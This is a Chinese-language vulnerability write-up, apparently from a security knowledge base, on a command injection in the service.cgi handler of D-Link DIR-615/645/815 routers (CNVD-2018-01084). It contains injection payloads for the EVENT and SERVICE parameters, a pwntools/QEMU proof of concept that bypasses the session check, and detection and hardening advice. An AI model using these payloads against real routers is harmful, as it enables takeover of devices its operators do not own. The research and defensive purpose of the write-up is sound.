---
id: iot-dlink-dir615-645-815-service-cgi-event-command-injection
title: D-Link DIR-615/645/815 service.cgi REQUEST_URI 参数命令注入（CNVD-2018-01084，固件 1.03 及之前）
type: scenario
domain: iot
path: iot
technique: servicecgi-main-request-uri-event-service-sprintf-lxmldbc-system-command-injection
aliases:
- CNVD-2018-01084
- DIR-615
- DIR-645
- DIR-815
- service.cgi
- servicecgi_main
- EVENT 命令注入
- SERVICE 命令注入
- cgibin 命令执行
- lxmldbc_system
- D-Link 路由器命令执行
tags:
- iot
- dlink
- router
- firmware
- cgi
- command-injection
- cnvd
- mips
- qemu
- lxmldbc
cve: []
affected_versions: 1.03 及之前的固件版本（D-Link DIR-615/645/815）
severity: high
confidence: medium
status: draft
created: '2026-11-07'
updated: '2026-11-07'
---

## 一句话结论

D-Link DIR-615/645/815（固件 1.03 及之前）的 `htdocs/cgibin` 按 CGI 名分发到 `servicecgi_main`，该函数从 HTTP 请求环境变量 `REQUEST_URI` 的查询串中解析 `EVENT`、`ACTION`、`SERVICE` 参数，直接以 `%s` 拼进 `"event %s > /dev/null"` 或 `"service %s start|stop|restart > /dev/null"`，再经 `lxmldbc_system()` 交给 `system()` 执行；参数中带 `;命令;` 即可注入任意 shell 命令（CNVD-2018-01084）。执行前有 `sess_ispoweruser()` 会话校验，需带合法管理员会话，或在可修改固件的场景下 NOP 掉该校验。

## 原理

- **CGI 分发**：`cgibin` 是多合一 CGI 二进制，按传入的 CGI 名（`service.cgi`）选择 `servicecgi_main` 处理。
- **请求解析**：`servicecgi_main` 先取 `REQUEST_METHOD`，只接受 `POST`；再取 `CONTENT_LENGTH`/`CONTENT_TYPE`，`CONTENT_TYPE` 需匹配 `application/x-www-form-urlencoded`；随后调用 `cgibin_parse_request()` 解析请求，返回值小于 0 则报错退出。解析器会在 `REQUEST_URI` 中查找 `?`，把 `?` 之后的查询串交给 `sub_402B40` 按 `&`、`=` 拆分，存入参数对象。
- **取参与拼接**：`sub_40A1C0("EVENT")`、`sub_40A1C0("ACTION")`、`sub_40A1C0("SERVICE")` 从解析结果里按名字取出值。若 `EVENT` 非空，命令模板为 `"event %s > /dev/null"`；否则要求 `ACTION` 与 `SERVICE` 都非空，并按 `ACTION` 的 `START`/`STOP`/`RESTART` 选择 `"service %s start > /dev/null"`、`"service %s stop > /dev/null"`、`"service %s restart > /dev/null"`。用户值被原样作为 `%s` 填入。
- **执行**：`lxmldbc_system()` 内部把格式化后的命令串交给 `system()`，后者走 `/bin/sh -c`。由于拼接前没有任何字符转义或白名单，分号、管道、`&&`、`$()` 等在 shell 中重新获得命令分隔语义，形成命令注入。
- **为什么四条路都通**：命令模板无论走 `EVENT` 分支还是 `ACTION`+`SERVICE` 分支，最终都汇聚到同一个 `lxmldbc_system()`；`ACTION` 只用于选模板，不参与拼接，`SERVICE`/`EVENT` 才是注入点。
- **认证前置**：拼接前有 `sess_ispoweruser()` 检查 Cookie 会话，失败则返回 `Not authorized`。真机需有效管理员会话；文章在 QEMU 用户态没有会话配置文件，调试时在 `servicecgi_main+316`（`0x40A3A4`）把返回值 `$v0` 置 1 跳过。

## 触发条件

- 目标为 D-Link DIR-615/645/815，固件版本 1.03 及之前（CNVD-2018-01084）。
- 能访问设备的 CGI 入口并发送 HTTP `POST`；`REQUEST_METHOD=POST`、`CONTENT_TYPE=application/x-www-form-urlencoded`，`REQUEST_URI` 中包含 `?` 查询串。
- 需通过 `sess_ispoweruser()` 管理员会话校验：持有合法管理员 Cookie，或在获得固件/调试能力的场景下修改二进制 NOP 掉该校验（文章采用后者在 QEMU 中复现）。
- 注入值出现在 `REQUEST_URI` 的 `EVENT` 或 `SERVICE` 参数中，且以 `;命令;` 等形式闭合模板。

## 利用步骤

1. 解包固件，定位 `/htdocs/cgibin`，在 IDA 中确认 `servicecgi_main`、`sub_40A1C0` 与 `lxmldbc_system` 的调用关系。
2. 确认请求必须为 POST 且 `CONTENT_TYPE` 为 `application/x-www-form-urlencoded`；GET 或其他类型会直接报错。
3. 用 QEMU 用户态复现：以 `-0 "service.cgi"` 指定 CGI 名，通过 `-E` 设置 `REQUEST_METHOD`、`REQUEST_URI`、`CONTENT_LENGTH`、`CONTENT_TYPE`，运行 `./htdocs/cgibin`。
4. 若被 `sess_ispoweruser()` 拦住，在 `0x40A3A4` 断点处把返回值置 1（或按真机方式携带有效管理员 Cookie）。
5. 构造注入 payload：
   - `REQUEST_URI="123?EVENT=;{cmd};&abc"`
   - `REQUEST_URI="123?ACTION=STOP&SERVICE=;{cmd};"`
   - `REQUEST_URI="123?ACTION=START&SERVICE=;{cmd};"`
   - `REQUEST_URI="123?ACTION=RESTART&SERVICE=;{cmd};"`
6. 观察命令输出或写入文件验证；真机无回显时可反弹 shell 或带外验证。

## PoC

文章的最小复现（QEMU 用户态，需先在调试器跳过会话校验）：

```python
from pwn import *
context.arch = 'mips'
context.os = 'linux'

cmd = input("command:")
p = process(f'''
qemu-mipsel -L . \
    -0 "service.cgi" \
    -E REQUEST_METHOD="POST" \
    -E REQUEST_URI="123?EVENT=;{cmd};&abc" \
    -E CONTENT_LENGTH=14 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -g 6666 \
    ./htdocs/cgibin
''', shell=True)

gdb.attach(target=("localhost", 6666), exe="./htdocs/cgibin",
           gdbscript="b *0x40A3A4\nc\n")
pause()
p.send("Thir0th=AGRiot")
p.interactive()
```

国内其他分支等价 payload：

```text
REQUEST_URI="123?ACTION=STOP&SERVICE=;ls;"
REQUEST_URI="123?ACTION=START&SERVICE=;ls;"
REQUEST_URI="123?ACTION=RESTART&SERVICE=;ls;"
```

拼接逻辑要点：

```c
v5 = sub_40A1C0("EVENT");
v7 = sub_40A1C0("ACTION");
v6 = sub_40A1C0("SERVICE");
if (v5)
    cmd = "event %s > /dev/null";
else {
    if (!v6 || !v7) goto LABEL_27;
    if (!strcasecmp(v7, "START"))   cmd = "service %s start > /dev/null";
    else if (!strcasecmp(v7, "STOP")) cmd = "service %s stop > /dev/null";
    else if (!strcasecmp(v7, "RESTART")) cmd = "service %s restart > /dev/null";
    else { snprintf(s, 0x100, "Unknown action - '%s'", v7); goto LABEL_10; }
}
lxmldbc_system(cmd, v5 ? v5 : v6);
```

## 变体与关联

- 注入点变体：`EVENT` 与 `SERVICE` 均可注入；`ACTION` 只决定走哪条模板分支，不能直接注入。
- 同一固件 `cgibin` 的相邻入口：[`iot-protocol-dlink-dir645-ssdpcgi-command-injection`](iot-protocol-dlink-dir645-ssdpcgi-command-injection.md)（`ssdpcgi_main` 的 `HTTP_ST` 环境变量经同一 `lxmldbc_system()` 执行，CVE-2024-22651），两者入口、注入参数与 CVE/CNVD 不同，但共用危险 sink，挖洞时可一并枚举其它 `*cgi_main`。
- 关联：[`binary-pwn-stack-mips-hedwig-cgi-uid-rop`](binary-pwn-stack-mips-hedwig-cgi-uid-rop.md)（同系列 hedwig.cgi 的栈溢出），以及 [`iot-firmware-boa-pin-command-injection`](iot-firmware-boa-pin-command-injection.md)（D-Link 固件另一 CGI 参数拼 system）。

## 检测与防御

- 升级到修复版本固件；无法升级时限制管理界面仅内网/可信网段访问，禁用不必要的远程管理。
- 在边界与设备侧检测：`REQUEST_URI` 查询串中出现 `;`、`|`、`&&`、`$(`、反引号、换行等 shell 元字符；`service.cgi`/`cgibin` 出现异常子进程或长时间阻塞在 `system()`；`/tmp`、`/var` 出现异常文件。
- 代码层：不要用 `sprintf`/格式化字符串把请求参数拼进 `system()` 命令；改用固定 argc/argv 的 `execve`，或对 `EVENT`/`SERVICE` 做严格白名单与字符集校验。
- 加固：Web/CGI 进程降权运行，设备管理面与 WAN 隔离，启用固件签名与安全启动。
